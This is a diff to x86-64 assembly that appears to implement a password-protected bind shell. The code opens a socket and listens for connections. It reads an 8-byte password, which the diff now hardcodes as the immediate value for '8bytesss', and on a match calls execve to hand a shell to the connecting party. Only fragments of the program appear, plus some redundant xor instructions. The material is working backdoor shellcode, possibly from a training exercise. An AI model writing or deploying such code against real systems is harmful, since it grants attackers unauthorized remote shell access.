@@ -1,6 +1,9 @@
 global _start
 
+section .text
+
 _start:
+
 
         mov rax, 41
         mov rdi, 2
@@ -23,6 +26,8 @@ _start:
         mov rdx, 16
         syscall
 
+        xor rsi, rsi
+        
         mov rax, 50
         mov rsi, 2
         syscall
@@ -57,11 +62,13 @@ _start:
 
         push r10
         mov rsi, rsp
-
-        mov rdx, 16
+        
+        xor rdx, rdx
+        mov rdx, 8
         syscall
 
-        mov rax, [rel pass]
+        xor rax, rax
+        mov rax, 0x7373736574796238
         mov rdi, rsi
         scasq
         jne exit
@@ -83,9 +90,7 @@ _start:
         mov rax, 59
         syscall
 
-        ; change as needed
-        pass: db "8bytesss"
-
 exit:
+        xor rax, rax
         mov rax, 60
         syscall
